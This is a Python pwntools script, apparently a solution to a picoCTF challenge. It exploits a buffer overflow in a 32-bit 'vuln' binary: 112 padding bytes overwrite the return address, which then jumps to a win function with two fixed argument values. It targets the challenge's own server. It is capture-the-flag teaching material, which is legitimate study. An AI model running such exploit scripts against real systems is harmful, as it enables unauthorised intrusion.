#!/usr/bin/env python3
from pwn import *
import sys
host = "saturn.picoctf.net"
port = 51544
context(terminal = ['tmux', 'new-window'])

#make sure you put the correct binary name and path below
binary = context.binary = ELF("./vuln")

context(os = "linux", arch = "i386")
c = remote(host, port)
log.info("[+] Starting buffer Overflow")
c.recvuntil(b"Please enter your string:")
log.info("[+] Crafting payload")
payload = b"A" * 112
payload += p32(0x08049296)
payload += b"A" * 4
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)
log.info("[+] Sending Payload to the remote server")
c.sendline(payload)
c.recv()
log.info("[+] STRG + D to end the interactive session!")
c.interactive()
